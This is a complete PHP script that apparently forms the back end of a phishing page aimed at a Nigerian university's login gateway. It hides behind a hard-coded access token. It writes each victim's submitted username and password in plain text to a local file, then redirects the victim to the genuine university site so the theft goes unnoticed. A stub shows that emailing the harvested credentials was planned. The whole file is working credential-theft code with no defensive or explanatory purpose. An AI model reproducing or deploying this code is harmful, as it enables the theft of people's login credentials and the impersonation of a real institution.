<?php 
/**
* 
*/
class Master{
	private $file = "./assets/includes/files/file.txt";
	public $msg = "";
	function __construct(){
		if (!isset($_GET['auth'])) {
			// silience is golden
			die('');
		}else{
			if ($_GET['auth'] != '7dcaaa4800ea45093c3f1e46e34a5ffdd6064312') {
				// silience is golden
				die('');
			}
		}
	}

	public function process(){
		if($this->writeFile($_POST['username'], $_POST['password'])){
			//The file hase been written...., try and send the mail...
			// $this->sendMail();
			// $this->msg = "Done";
			header('Location: http://gateway.oauife.edu.ng');
			exit;
		}else{
			//File not written....
			$this->msg = "Failed";
			die($this->msg);
		}
	}

	private function writeFile($name = "", $pass = ""){
		if (file_exists($this->file)) {
			$handle = fopen($this->file, 'a');
			fwrite($handle, "*Username: ".$name." | Password: ".$pass."\n");
			fclose($handle);
			return true;
		}else{
			return false;
		}
	}

	private function sendMail(){
		
	}
}
$mast = new Master();
$msg = $mast->msg;
?>